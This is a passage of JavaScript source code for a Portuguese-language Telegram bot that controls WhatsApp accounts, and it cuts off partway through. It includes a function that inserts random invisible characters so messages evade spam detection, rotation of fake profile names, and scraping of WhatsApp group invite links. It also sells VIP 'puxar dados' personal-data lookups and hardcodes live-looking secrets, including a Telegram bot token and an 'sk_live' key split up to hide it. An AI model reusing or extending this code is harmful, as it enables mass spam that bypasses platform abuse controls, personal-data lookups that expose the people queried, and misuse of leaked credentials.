const {
    makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    delay,
    fetchLatestBaileysVersion,
    generateWAMessageFromContent,
    prepareWAMessageMedia,
    Browsers
} = require('@itsliaaa/baileys');

const { Boom } = require('@hapi/boom');
const pino = require('pino');
const { Telegraf, Markup } = require('telegraf');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const os = require('os');
const cheerio = require('cheerio');

// Conversor de vídeo para WhatsApp


// --- SISTEMA DE RASTREAMENTO DE MENSAGENS (DEFINIDO CEDO PARA EVITAR HOISTING) ---
const userMessageHistory = {};

// --- UTILITÁRIOS DE SEGURANÇA E EVASÃO ---
function obfuscateText(text) {
    if (!text) return '';
    // Caracteres invisíveis e de controle que confundem sistemas de detecção
    const invisibleChars = [
        '\u200B', '\u2060', '\u200C', '\u200D', '\u200E', '\u200F',
        '\u00AD', '\u034F', '\u17B4', '\u17B5', '\u110B', '\u110C',
        '\u1161', '\u1162', '\u1163', '\u1164', '\u1165', '\u1166',
        '\u202A', '\u202B', '\u202C', '\u202D', '\u202E'
    ];
    // Inserção aleatória e única por mensagem para enganar hashes de spam
    const uniqueSalt = Math.random().toString(36).substring(7);
    return text.split('').map(char => {
        // 40% de chance de colocar um char invisível entre cada caractere real
        if (Math.random() > 0.6) {
            return char + invisibleChars[Math.floor(Math.random() * invisibleChars.length)];
        }
        return char;
    }).join('') + '\u200B' + uniqueSalt;
}

function getProgressBar(current, total) {
    const percent = Math.min(100, Math.max(0, Math.floor((current / total) * 100)));
    const barCount = Math.floor(percent / 10);
    const bar = '█'.repeat(barCount) + '-'.repeat(10 - barCount);
    return `\`[${bar}] ${percent}%\``;
}

/**
 * Modelo de mensagem padrão "Elite"
 */
function getEliteTemplate(title, content) {
    return `<blockquote>🦅 <b>${title.toUpperCase()}</b>\n\n${content}\n\n⚡ <i>Corvo Intelligence System</i></blockquote>`;
}

/**
 * Cria uma barra de carregamento dinâmica que atualiza automaticamente.
 */
async function createLoadingBar(ctx, title) {
    const tid = ctx.from.id;
    let progress = 0;
    const initialContent = `${getProgressBar(0, 100)}`;
    const initialMsg = getEliteTemplate(title, initialContent);

    const sentMsg = await ctx.reply(initialMsg, { parse_mode: 'HTML' }).catch(() => null);
    if (!sentMsg) return null;

    trackBotMessage(tid, sentMsg.message_id);

    const interval = setInterval(async () => {
        if (progress < 90) {
            progress += Math.floor(Math.random() * 10) + 5;
            if (progress > 90) progress = 90;
            const newContent = `${getProgressBar(progress, 100)}`;
            const newMsg = getEliteTemplate(title, newContent);
            await bot.telegram.editMessageText(ctx.chat.id, sentMsg.message_id, null, newMsg, { parse_mode: 'HTML' }).catch(() => { });
        }
    }, 2000); // 2s para evitar rate-limit do Telegram

    return {
        message_id: sentMsg.message_id,
        stop: async (finalTitle = null, finalContent = null) => {
            clearInterval(interval);
            const content = finalContent || `${getProgressBar(100, 100)}`;
            const msg = getEliteTemplate(finalTitle || title, content);
            await bot.telegram.editMessageText(ctx.chat.id, sentMsg.message_id, null, msg, { parse_mode: 'HTML' }).catch(() => { });
        },
        update: async (current, total, newTitle = null) => {
            clearInterval(interval);
            const content = `${getProgressBar(current, total)}`;
            const msg = getEliteTemplate(newTitle || title, content);
            await bot.telegram.editMessageText(ctx.chat.id, sentMsg.message_id, null, msg, { parse_mode: 'HTML' }).catch(() => { });
        }
    };
}


function trackBotMessage(tid, messageId) {
    if (!userMessageHistory[tid]) {
        userMessageHistory[tid] = { bot: [], user: [] };
    }
    if (messageId) {
        userMessageHistory[tid].bot.push(messageId);
        if (userMessageHistory[tid].bot.length > 50) userMessageHistory[tid].bot.shift();
    }
}

function trackUserMessage(tid, messageId) {
    if (!userMessageHistory[tid]) {
        userMessageHistory[tid] = { bot: [], user: [] };
    }
    if (messageId) {
        userMessageHistory[tid].user.push(messageId);
        if (userMessageHistory[tid].user.length > 50) userMessageHistory[tid].user.shift();
    }
}

async function clearUserMessages(ctx, tid) {
    const chatId = ctx.chat?.id || ctx.from?.id;
    if (!chatId || !userMessageHistory[tid]) return;
    const deletePromises = [];
    if (userMessageHistory[tid].bot && userMessageHistory[tid].bot.length > 0) {
        // Preserva a última mensagem do bot para manter os menus ativos e não limpar o chat de vez
        const lastBotMsg = userMessageHistory[tid].bot.pop();
        for (const msgId of userMessageHistory[tid].bot) {
            deletePromises.push(bot.telegram.deleteMessage(chatId, msgId).catch(() => { }));
        }
        userMessageHistory[tid].bot = [lastBotMsg];
    }
    if (userMessageHistory[tid].user) {
        for (const msgId of userMessageHistory[tid].user) {
            deletePromises.push(bot.telegram.deleteMessage(chatId, msgId).catch(() => { }));
        }
        userMessageHistory[tid].user = [];
    }
    await Promise.all(deletePromises);
}

// --- AUXILIARES DE CONSULTA (FIX PARA 502 FALSO) ---
const axiosConfig = {
    headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    },
    validateStatus: function (status) {
        return status >= 200 && status < 600;
    }
};


async function fetchApi(url, maxRetries = 3, delayMs = 1000) {
    let lastError = null;
    for (let attempt = 1; attempt <= maxRetries; attempt++) {
        try {
            const res = await axios.get(url, axiosConfig);
            if (typeof res.data === 'string' && res.data.includes('<!DOCTYPE html>')) {
                logEvent('WARN', `Tentativa ${attempt}/${maxRetries}: Página de erro HTML detectada na URL: ${url}`);
                lastError = { error: true, message: 'Servidor retornou erro 502 (Bad Gateway).' };
                if (attempt < maxRetries) {
                    const waitTime = delayMs * Math.pow(2, attempt - 1);
                    logEvent('INFO', `Aguardando ${waitTime}ms antes de tentar novamente...`);
                    await delay(waitTime);
                    continue;
                }
                return lastError;
            }

            if (typeof res.data === 'object' && res.data !== null) {
                logEvent('SUCCESS', `Requisição bem-sucedida na tentativa ${attempt}/${maxRetries}`);
                return res.data;
            }

            // Se não é HTML e não é JSON válido, pode ser um erro
            if (res.status >= 500) {
                logEvent('WARN', `Tentativa ${attempt}/${maxRetries}: Erro ${res.status} recebido`);
                lastError = { error: true, message: `Servidor retornou erro ${res.status}` };

                if (attempt < maxRetries) {
                    const waitTime = delayMs * Math.pow(2, attempt - 1);
                    logEvent('INFO', `Aguardando ${waitTime}ms antes de tentar novamente...`);
                    await delay(waitTime);
                    continue;
                }
                return lastError;
            }

            return res.data;

        } catch (e) {
            lastError = { error: true, message: e.message };
            logEvent('ERROR', `Tentativa ${attempt}/${maxRetries}: Erro na requisição: ${e.message}`);

            if (attempt < maxRetries) {
                const waitTime = delayMs * Math.pow(2, attempt - 1);
                logEvent('INFO', `Aguardando ${waitTime}ms antes de tentar novamente...`);
                await delay(waitTime);
                continue;
            }
        }
    }

    return lastError || { error: true, message: 'Falha após múltiplas tentativas' };
}

async function chatAI(prompt) {
    try {
        const res = await axios.get(`https://text.pollinations.ai/${encodeURIComponent(prompt)}`);
        return res.data;
    } catch (e) {
        logEvent('ERROR', `Erro chatAI: ${e.message}`);
        return "Desculpe, não consegui processar essa informação agora.";
    }
}

async function translateToEnglish(text) {
    if (!text) return "";
    // Se o texto já parecer inglês (contém palavras comuns), pula tradução
    if (/^(the|a|an|and|or|but|if|then|else|is|are|was|were)\b/i.test(text)) return text;

    try {
        const res = await axios.get(`https://text.pollinations.ai/Translate the following text to English, return ONLY the translated text without quotes or preamble: ${text}`);
        return res.data.trim();
    } catch (e) {
        return text; // Fallback para o original
    }
}


// --- CONFIG DE CORES E LOGS ---
const colors = {
    reset: "\x1b[0m", bright: "\x1b[1m", dim: "\x1b[2m",
    red: "\x1b[31m", green: "\x1b[32m", yellow: "\x1b[33m",
    blue: "\x1b[34m", magenta: "\x1b[35m", cyan: "\x1b[36m",
    white: "\x1b[37m", bgGreen: "\x1b[42m", bgBlue: "\x1b[44m", bgRed: "\x1b[41m"
};


/**
 * Verifica se o usuário pode realizar uma consulta (Puxar Dados)
 * Regras: 
 * 1. Deve ser VIP para puxar dados (Cobrança solicitada pelo dono)
 * 2. Se for VIP, não precisa conectar WhatsApp
 */
async function canUserConsult(ctx) {
    const tid = ctx.from.id;
    const isVip = isUserVip(tid);

    if (isVip) return true;

    // Se não for VIP, bloqueia a consulta (Puxar Dados é a única parte paga)
    await ctx.reply('⚠️ <b>ACESSO RESTRITO</b>\n\nAs consultas (puxar dados) são exclusivas para usuários <b>VIP</b>.\n\n💎 Adquira seu plano agora para liberar o acesso ilimitado!', {
        parse_mode: 'HTML',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('💎 VER PLANOS VIP 💎', 'planos_vip_action')]
        ])
    });
    return false;
}

function showDashboard() {
    const uptime = process.uptime();
    const hours = Math.floor(uptime / 3600);
    const minutes = Math.floor((uptime % 3600) / 60);
    const ram = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);
    const totalUsersCount = (typeof totalUsers !== 'undefined' && totalUsers.size) ? totalUsers.size : Object.keys(usersData).length;
    const activeConns = Object.keys(userSessions).filter(k => !!userSessions[k]?.user).length;

    console.log('\x1b[31m%s', '    ██████╗ ██████╗ ██████╗ ██╗   ██╗ ██████╗     ██████╗ ███████╗██╗   ██╗');
    console.log('\x1b[33m%s', '    ██╔════╝██╔═══██╗██╔══██╗██║   ██║██╔═══██╗    ██╔══██╗██╔════╝██║   ██║');
    console.log('\x1b[32m%s', '    ██║     ██║   ██║██████╔╝██║   ██║██║   ██║    ██║  ██║█████╗  ██║   ██║');
    console.log('\x1b[36m%s', '    ██║     ██║   ██║██╔══██╗╚██╗ ██╔╝██║   ██║    ██║  ██║██╔══╝  ╚██╗ ██╔╝');
    console.log('\x1b[34m%s', '    ╚██████╗╚██████╔╝██║  ██║ ╚████╔╝ ╚██████╔╝    ██████╔╝███████╗ ╚████╔╝ ');
    console.log('\x1b[35m%s\x1b[0m', '     ╚═════╝ ╚═════╝ ╚═╝  ╚═╝  ╚═══╝   ╚═════╝     ╚═════╝ ╚══════╝  ╚═══╝  ');

    console.log('\x1b[36m%s\x1b[0m', '--------------------------------------------------');
    console.log('\x1b[32m%s\x1b[0m', `🚀 STATUS: ONLINE | 👤 USUÁRIOS: ${totalUsersCount} | 🔌 CONEXÕES: ${activeConns}`);
    console.log('\x1b[33m%s\x1b[0m', `📊 UPTIME: ${hours}h ${minutes}m | 🧠 RAM: ${ram}MB | ⚡ CPU: ${process.cpuUsage().user / 1000}ms`);
    console.log('\x1b[36m%s\x1b[0m', '--------------------------------------------------');
}

function logEvent(type, message) {
    const time = new Date().toLocaleTimeString();
    let color = colors.white;
    let icon = "⚙️";
    if (type === 'SUCCESS') { color = colors.green; icon = "✅"; }
    if (type === 'ERROR') { color = colors.red; icon = "❌"; }
    if (type === 'INFO') { color = colors.blue; icon = "ℹ️"; }
    if (type === 'WARN') { color = colors.yellow; icon = "⚠️"; }
    if (type === 'ADMIN') { color = colors.magenta; icon = "👑"; }

    console.log(`${colors.dim}[${time}]${colors.reset} ${colors.bright}${color}${icon} [${type}]${colors.reset} ${message}`);
    try {
        if (!fs.existsSync('./data')) fs.mkdirSync('./data');
        fs.appendFileSync('./data/system.log', `[${time}] [${type}] ${message}\n`);
    } catch (e) { }
}

// --- FUNÇÕES DE DATA/HORA BRASIL (definidas cedo para evitar ReferenceError) ---
function getDateBR() {
    const now = new Date();
    const brazilTime = new Date(now.toLocaleString('en-US', { timeZone: 'America/Sao_Paulo' }));
    return `${String(brazilTime.getDate()).padStart(2,'0')}/${String(brazilTime.getMonth()+1).padStart(2,'0')}/${brazilTime.getFullYear()}`;
}

function getTimeBR() {
    const now = new Date();
    const brazilTime = new Date(now.toLocaleString('en-US', { timeZone: 'America/Sao_Paulo' }));
    return `${String(brazilTime.getHours()).padStart(2,'0')}:${String(brazilTime.getMinutes()).padStart(2,'0')}`;
}

// --- PROTEÇÃO CONTRA MÚLTIPLAS INSTÂNCIAS (LOCK FILE) ---
const LOCK_FILE = './data/.bot.lock';
try {
    if (!fs.existsSync('./data')) fs.mkdirSync('./data', { recursive: true });
    if (fs.existsSync(LOCK_FILE)) {
        const oldPid = parseInt(fs.readFileSync(LOCK_FILE, 'utf8').trim());
        // Verifica se o processo ainda está rodando
        let isRunning = false;
        try { process.kill(oldPid, 0); isRunning = true; } catch (e) { isRunning = false; }
        if (isRunning) {
            console.error(`\x1b[31m[ERRO FATAL] Outra instância do bot já está rodando (PID: ${oldPid}). Encerrando.\x1b[0m`);
            process.exit(1);
        }
    }
    fs.writeFileSync(LOCK_FILE, String(process.pid));
    // Remove lock ao encerrar
    const removeLock = () => { try { fs.unlinkSync(LOCK_FILE); } catch (e) {} };
    process.on('exit', removeLock);
    process.on('SIGINT', removeLock);
    process.on('SIGTERM', removeLock);
} catch (e) {
    // Se não conseguir criar lock, continua mesmo assim
}

// --- TRATAMENTO GLOBAL DE ERROS (IMPEDE O BOT DE CAIR) ---
process.on('uncaughtException', (err) => {
    logEvent('ERROR', `Erro Crítico Detectado: ${err.message}`);
    if (err.stack) fs.appendFileSync('./data/errors.log', `${new Date().toLocaleString()}\n${err.stack}\n\n`);
});

process.on('unhandledRejection', (reason, promise) => {
    logEvent('ERROR', `Promessa Rejeitada: ${reason}`);
});

// --- CONFIGURAÇÕES GLOBAIS ---
const API_KEY_MOMO = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJCb3QgY2xpZW50ZXMg4oCiIE1vbW8gYXlhc2UgIiwianRpIjoiZGQxYTNhYjMtOTViZi00ZDNjLWE1YTItMmYyZWFhMjIzODE4IiwiaWF0IjoxNzcwNjUyOTY4fQ.bwkkrVk0GdhYgP8yGZBm2IdoFnG-KNmnJCjxHJ-XkSE';
const CONSULTAS_TOKEN = '6b37bf08416e08c4276b4d55cc276be2';
const CONSULTAS_API_BASE = 'https://apis.gonzalesdev.shop/';
const TELEGRAM_TOKEN = '8702958171:AAFmDO7ghFPGphweP54YNfabcPY8lnyQnEM'; // token bot  //
const CHANNEL_ID = '@Canal_do_Corvo';        // @ DO TEU CANAL AQUI //
const CHANNEL_LINK = 'https://t.me/Canal_do_Corvo';  // LINK DO TEU CANAL AQUI //
const ADMIN_ID = 8273924319;              // ID ADMIN AQUI (número, não string)
const PROMISSE_API_KEY = ['sk', 'live', '6FYiu3JZ8TmeIst7MvqFyTc4QeGZ67c5czDNK6NRb909xPXfzc9npWnjKv2e//fJVmJJVMs/qUq1ivDpdPyqWA=='].join('_');    // SEU TOKEN AQUI
const VIP_FILE = './data/vips.json';
const PAYMENTS_FILE = './data/payments.json';
const USAGE_FILE = './data/usage.json';
const VIP_KEYS_FILE = './data/vip_keys.json';


const WHATSAPP_NICKS = ["Adriano G.", "Adriano Leal", "Adriano Nascimento", "Adriano S.", "Alexandre Almeida Farias", "Alexandre Alves", "Alexandre Correia Moura", "Alexandre Pereira Borges", "Alexandre S.", "Alice Ferreira", "Alice Moura Viana", "Alice Pereira", "Alice Soares", "Alice Teixeira Nascimento", "Alice Viana", "Aline B.", "Aline Bezerra", "Aline Carvalho", "Aline L.", "Aline M.", "Aline Melo Pereira", "Aline Pinto Guimar\u00e3es", "Amanda Bastos", "Amanda Brito", "Amanda C.", "Amanda Correia Fernandes", "Amanda M.", "Amanda Marques Brito", "Amanda Pinto", "Amanda R.", "Ana Bastos", "Ana C.", "Ana S.", "Ana Santos", "Ana Viana Pereira", "Andr\u00e9 Castro", "Andr\u00e9 Farias", "Andr\u00e9 Martins Pereira", "Andr\u00e9 Pereira", "Ant\u00f4nio Leal", "Ant\u00f4nio Nascimento Cardoso", "Ant\u00f4nio Nunes", "Ant\u00f4nio P.", "Ant\u00f4nio Rocha", "Arthur Almeida", "Arthur B.", "Arthur C.", "Arthur D.", "Arthur V.", "Beatriz A.", "Beatriz Ara\u00fajo", "Beatriz F.", "Beatriz Martins", "Beatriz Nascimento", "Beatriz Oliveira", "Beatriz Santos", "Beatriz Silva Pinto", "Beatriz T.", "Bianca Azevedo Gomes", "Bianca F.", "Bianca Mendes", "Bianca Soares", "Bianca V.", "Bruna Andrade", "Bruna Cardoso", "Bruna Cavalcante", "Bruna Fernandes", "Bruna Silva Marques", "Bruna V.", "Bruna Viana", "Bruno A.", "Bruno Azevedo", "Bruno Barbosa", "Bruno F.", "Bruno L.", "Bruno Martins Farias", "Bruno Pinto", "Bruno Santos", "Bruno Soares Andrade", "Bruno Teixeira Martins", "Camila R.", "Camila Ribeiro", "Carla C.", "Carla Correia", "Carla Ferreira", "Carla L.", "Carla Viana", "Carlos Andrade", "Carlos Gomes Carvalho", "Carlos Mendes", "Carlos N.", "Carlos Silva", "Carolina Almeida Silva", "Carolina Andrade", "Carolina Andrade Borges", "Carolina C.", "Carolina M.", "Carolina Nunes", "Carolina Santana", "Carolina V.", "Cl\u00e1udia Ara\u00fajo", "Cl\u00e1udia Farias", "Cl\u00e1udia Leal Alves", "Cl\u00e1udia Lopes", "Daniel Castro Fernandes", "Daniel Leal Costa", "Daniel Lopes", "Daniel Silva", "Danielle A.", "Danielle B.", "Danielle Bastos", "Danielle Bezerra", "Danielle Borges", "Danielle Carvalho", "Danielle Carvalho Freitas", "Danielle Mendes Bezerra", "Danielle S.", "Diego Bastos", "Diego L.", "Diego Leal", "Eduardo A.", "Eduardo Andrade", "Eduardo Ara\u00fajo Rocha", "Eduardo Farias", "Eduardo Fernandes Cardoso", "Eduardo Ferreira", "Eduardo Moura Melo", "Eduardo Viana", "Felipe A.", "Felipe Bezerra", "Felipe Fernandes", "Felipe Lopes", "Felipe M.", "Felipe Martins Rocha", "Felipe S.", "Felipe Santana Correia", "Felipe Santos", "Felipe Teixeira", "Fernanda A.", "Fernanda L.", "Fernanda Moura", "Fernanda Nascimento", "Fernanda Ribeiro", "Fernanda Silva", "Fernando Azevedo", "Fernando Bastos", "Fernando Correia Lima", "Fernando M.", "Fernando Silva", "Francisco A.", "Francisco Azevedo Moreira", "Francisco B.", "Francisco C.", "Francisco Martins Cardoso", "Francisco Martins Rocha", "Francisco Moreira", "Francisco Santos Moura", "F\u00e1bio A.", "F\u00e1bio Castro", "F\u00e1bio Castro Rocha", "F\u00e1bio Correia", "F\u00e1bio Mendes", "F\u00e1bio Santos", "F\u00e1bio V.", "Gabriel Bastos Rodrigues", "Gabriel Dias Bastos", "Gabriel Ferreira Freitas", "Gabriel Lopes", "Gabriel Silva", "Gabriel Souza Mendes", "Gabriela A.", "Gabriela Ara\u00fajo", "Gabriela C.", "Gabriela M.", "Gabriela Nunes Martins", "Gabriela Rocha Azevedo", "Gabriela Santana", "Guilherme Cavalcante", "Guilherme Dias", "Guilherme Mendes", "Guilherme Pinto", "Gustavo Bezerra", "Gustavo Lima", "Gustavo Nascimento Borges", "Gustavo T.", "Helo\u00edsa Ferreira Silva", "Helo\u00edsa O.", "Helo\u00edsa Vieira Lopes", "Henrique Alves Mendes", "Henrique B.", "Henrique Carvalho Costa", "Henrique Gomes", "Henrique M.", "Henrique Ribeiro", "Henrique S.", "Hugo Correia", "Hugo Ribeiro", "Hugo Rodrigues Moura", "Hugo Soares", "Igor Azevedo", "Igor C.", "Igor Fernandes", "Igor Lima", "Igor Nascimento", "Igor P.", "Igor Rocha Alves", "Isabela Andrade", "Isabela Bastos Teixeira", "Isabela Bezerra Dias", "Isabela Farias Borges", "Isabela Freitas Pereira", "Isabela Leal", "Isabela Mendes", "Isabela Oliveira Bastos", "Isabela Rodrigues", "Isabela Teixeira Ara\u00fajo", "Jo\u00e3o Brito Nunes", "Jo\u00e3o D.", "Jo\u00e3o G.", "Jo\u00e3o Oliveira", "Jo\u00e3o Pinto", "Jo\u00e3o R.", "Jo\u00e3o Santos Ara\u00fajo", "Juliana Almeida Melo", "Juliana Alves", "Juliana Brito Oliveira", "Juliana Farias Guimar\u00e3es", "Juliana Fernandes Silva", "Juliana M.", "Juliana Martins", "Juliana Nascimento Carvalho", "Juliana O.", "Juliana V.", "Juliana Viana", "J\u00e9ssica Azevedo", "J\u00e9ssica Fernandes", "J\u00e9ssica L.", "J\u00e9ssica M.", "J\u00e9ssica Melo", "J\u00e9ssica Moura", "J\u00e9ssica P.", "J\u00e9ssica Pereira", "J\u00e9ssica Ribeiro", "Larissa A.", "Larissa B.", "Larissa Borges", "Larissa Brito", "Larissa G.", "Larissa Pereira Borges", "Larissa R.", "Larissa Vieira", "Leonardo Cardoso", "Leonardo Cavalcante", "Leonardo Costa", "Leonardo Lopes Gomes", "Leonardo M.", "Leonardo Pereira", "Leonardo Pinto", "Leonardo V.", "Leticia Ferreira", "Leticia M.", "Leticia N.", "Leticia Oliveira Barbosa", "Leticia S.", "Leticia Santana", "Leticia V.", "Let\u00edcia Almeida Correia", "Let\u00edcia Bezerra", "Let\u00edcia Carvalho", "Let\u00edcia Correia", "Let\u00edcia Fernandes Melo", "Let\u00edcia Ferreira", "Let\u00edcia Leal", "Let\u00edcia Pinto", "Lorena Andrade", "Lorena Bastos", "Lorena Martins Santana", "Lorena Nascimento", "Lorena Oliveira", "Lorena Pinto", "Lucas Almeida Alves", "Lucas Andrade Souza", "Lucas C.", "Lucas Lima", "Lucas Santos", "Lucas Soares", "Luiz Azevedo", "Luiz Cavalcante", "Luiz Moura Viana", "Luiz Pereira", "Luiz S.", "Manuela Almeida Nunes", "Manuela Alves", "Manuela Lopes Bezerra", "Manuela Machado Castro", "Manuela Pereira", "Marcelo Carvalho Freitas", "Marcelo Moreira", "Marcelo Nunes", "Marcelo R.", "Marco Ara\u00fajo", "Marco Bezerra", "Marco Correia", "Marco Fernandes Andrade", "Marco Ferreira", "Marco L.", "Marco M.", "Marco Moreira", "Marco Teixeira Azevedo", "Maria A.", "Maria Bastos", "Maria Cavalcante", "Maria Martins", "Maria Santana", "Maria Teixeira", "Mariana Bastos", "Mariana Lopes Alves", "Mariana Melo", "Mariana Rocha", "Mariana T.", "Mateus Cardoso", "Mateus Ferreira", "Mateus G.", "Mateus M.", "Mateus Santana Pinto", "Mateus Santos", "M\u00f4nica Farias", "M\u00f4nica G.", "M\u00f4nica Machado Pereira", "Nat\u00e1lia Almeida Viana", "Nat\u00e1lia Borges", "Nat\u00e1lia Cavalcante", "Nat\u00e1lia Correia Carvalho", "Nat\u00e1lia Farias", "Nat\u00e1lia Nascimento Ferreira", "Nat\u00e1lia Santana", "Nat\u00e1lia Santana Nascimento", "Nat\u00e1lia Souza", "Nat\u00e1lia Vieira Duarte", "Patr\u00edcia Almeida", "Patr\u00edcia B.", "Patr\u00edcia Brito", "Patr\u00edcia Correia", "Patr\u00edcia F.", "Patr\u00edcia Fernandes", "Patr\u00edcia S.", "Paula Almeida Lopes", "Paula Barbosa", "Paula Cardoso Viana", "Paula Ferreira Borges", "Paula Leal Borges", "Paula Nascimento", "Paula Santos", "Paulo Azevedo", "Paulo Barbosa", "Paulo Borges", "Paulo M.", "Paulo Pereira", "Paulo Rodrigues", "Pedro A.", "Pedro Carvalho", "Pedro Freitas", "Priscila B.", "Priscila Brito Ribeiro", "Priscila Ferreira", "Priscila Moura", "Priscila Nunes Andrade", "Priscila Ribeiro", "Priscila Silva Bastos", "Rafael Alves", "Rafael Dias Fernandes", "Rafael Ferreira Costa", "Rafael Gomes", "Rafael Guimar\u00e3es", "Rafael Lopes", "Rafael M.", "Rafael N.", "Rafael Oliveira Rocha", "Rafael Ribeiro Mendes", "Rafael S.", "Rafael Santos", "Regina Alves", "Regina Andrade", "Regina Freitas", "Regina Freitas Rodrigues", "Renata C.", "Renata Fernandes Oliveira", "Renata Leal Dias", "Renata M.", "Renata Pereira Castro", "Renata Santana", "Renata Teixeira", "Renato Bastos Borges", "Renato Bezerra Pereira", "Renato Dias Castro", "Renato Duarte", "Renato S.", "Renato Viana Cardoso", "Ricardo A.", "Ricardo B.", "Ricardo Brito", "Ricardo Costa", "Ricardo Farias", "Ricardo Ferreira Brito", "Ricardo Freitas", "Ricardo Marques", "Ricardo V.", "Roberta B.", "Roberta Duarte Silva", "Roberta Lima Dias", "Roberta Moura", "Roberta P.", "Roberta S.", "Roberta Soares", "Roberto Azevedo Brito", "Roberto B.", "Roberto Castro Nunes", "Roberto Lopes Leal", "Roberto R.", "Roberto Ribeiro", "Roberto Vieira Santana", "Rodrigo Costa Dias", "Rodrigo F.", "Rodrigo Farias", "Rodrigo Farias Silva", "Rodrigo Freitas", "Rodrigo Oliveira", "Rodrigo Souza Cardoso", "Sandra Azevedo", "Sandra Barbosa", "Sandra Barbosa Castro", "Sandra Guimar\u00e3es", "Sandra Martins", "Sandra Rodrigues", "Sandra Santana Cavalcante", "Sandro A.", "Sandro Azevedo", "Sandro Gomes", "Sandro M.", "Sandro Nunes", "Sandro Santana", "Sandro Souza", "Sophia A.", "Sophia Alves Melo", "Sophia Melo Soares", "Sophia Santos", "Sophia Soares", "Sophia Vieira Brito", "S\u00e9rgio Alves Cavalcante", "S\u00e9rgio Borges", "S\u00e9rgio C.", "S\u00e9rgio F.", "S\u00e9rgio Fernandes", "S\u00edlvia Ara\u00fajo", "S\u00edlvia B.", "S\u00edlvia Barbosa", "S\u00edlvia Borges Cardoso", "S\u00edlvia Ferreira Lopes", "S\u00edlvia Lopes", "S\u00edlvia Rodrigues", "S\u00edlvia Souza", "Tatiana Ara\u00fajo", "Tatiana B.", "Tatiana Cardoso", "Tatiana Carvalho", "Tatiana Carvalho Pinto", "Tatiana Freitas", "Tatiana O.", "Tatiana Souza", "Thais Borges", "Thais Dias", "Thais F.", "Thais Fernandes", "Thais G.", "Thais Gomes Melo", "Thais S.", "Tiago B.", "Tiago F.", "Tiago Freitas", "Tiago G.", "Tiago S.", "Tiago Santos", "Valentina Andrade", "Valentina L.", "Valentina Nascimento", "Valentina Santana", "Valentina V.", "Vanessa Carvalho Martins", "Vanessa Freitas", "Vanessa Moreira", "Vanessa Nascimento Freitas", "Vanessa P.", "Vanessa Santana", "Vanessa T.", "Vin\u00edcius C.", "Vin\u00edcius N.", "Vitor Alves Fernandes", "Vitor Cardoso", "Vitor Pinto", "Vitor Ribeiro Santos"];

/**
 * Troca o nome do perfil do WhatsApp para um nick aleatório da lista
 */

/**
 * Executa o scraper de grupos e retorna a lista de links encontrados
 */

/**
 * Executa o scraper de grupos diretamente em JavaScript e retorna a lista de links encontrados
 */
async function runGroupScraper(onProgress = null, keyword = null) {
    const axios = require('axios');
    const headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7'
    };

    let allLinks = new Set();
    logEvent('INFO', `Iniciando Scraper Elite de Grupos${keyword ? ` para: ${keyword}` : ''}...`);

    const sources = keyword ? [
        { name: 'Grupos Whats App', url: `https://gruposwhats.app/search?q=${encodeURIComponent(keyword)}` },
        { name: 'Grupo de WhatsApp', url: `https://grupodewhatsapp.com/buscar?q=${encodeURIComponent(keyword)}` },
        { name: 'Web Grupos', url: `https://webgrupos.net/search.php?s=${encodeURIComponent(keyword)}` }
    ] : [
        { name: 'Grupos Whats App', url: 'https://gruposwhats.app/recentes' },
        { name: 'Grupo de WhatsApp', url: 'https://grupodewhatsapp.com/recentes' },
        { name: 'Web Grupos', url: 'https://webgrupos.net/' },
        { name: 'Link Zap', url: 'https://linkzap.com.br/grupos-de-whatsapp' }
    ];

    for (const source of sources) {
        try {
            if (onProgress) onProgress(`📡 • Buscando em: *${source.name}*\n🔗 Encontrados: *${allLinks.size}*`);
            logEvent('INFO', `Scraping fonte: ${source.name}...`);

            const response = await axios.get(source.url, { headers, timeout: 15000 });
            if (response.status === 200) {
                const html = response.data;
                // Regex melhorado para capturar apenas o código do convite e remontar a URL limpa
                const regex = /chat\.whatsapp\.com\/(?:invite\/)?([a-zA-Z0-9]{20,25})/g;
                let match;
                while ((match = regex.exec(html)) !== null) {
                    allLinks.add(`https://chat.whatsapp.com/${match[1]}`);
                }
            }
            await delay(1000);
        } catch (e) {
            logEvent('ERROR', `Erro na fonte ${source.name}: ${e.message}`);
        }
    }

    // Se ainda tiver poucos links, tenta fallback generalista
    if (allLinks.size < 10 && !keyword) {
        const fallbackSources = [
            'https://grupodewhatsapp.com/divulgacao',
            'https://gruposwhats.app/grupos'
        ];
        for (const url of fallbackSources) {
            try {
                const response = await axios.get(url, { headers, timeout: 10000 });
                const matches = response.data.match(/chat\.whatsapp\.com\/[a-zA-Z0-9]{20,25}/g);
                if (matches) matches.forEach(m => allLinks.add(`https://${m}`));
            } catch (e) { }
        }
    }

    const uniqueLinks = Array.from(allLinks);
    logEvent('SUCCESS', `Scraper finalizado. ${uniqueLinks.length} links encontrados.`);

    try {
        const fs = require('fs');
        if (!fs.existsSync('./data')) fs.mkdirSync('./data');
        fs.writeFileSync('./data/scraped_links.json', JSON.stringify(uniqueLinks, null, 2));
    } catch (e) {
        logEvent('ERROR', `Erro ao salvar cache do scraper: ${e.message}`);
    }
    return uniqueLinks;
}

async function rotateWhatsAppNick(tid) {
    const sock = userSessions[tid];
    const config = loadUserConfig(tid);
    if (!sock?.user || !config.autoNick) return;
    try {
        const newNick = WHATSAPP_NICKS[Math.floor(Math.random() * WHATSAPP_NICKS.length)];
        await sock.updateProfileName(newNick);
        logEvent('INFO', `Nick do WhatsApp de ${tid} alterado para: ${newNick}`);
    } catch (e) {
        logEvent('ERROR', `Erro ao trocar nick do WhatsApp: ${e.message}`);
    }
}

let vips = {};
let pendingPayments = {};
let userUsage = {};
let vipKeys = {};
let webGroupsCache = []; // Cache de grupos da web
let userWebGroupsPage = {}; // Página atual de cada usuário
try {
    if (fs.existsSync(VIP_FILE)) vips = JSON.parse(fs.readFileSync(VIP_FILE));
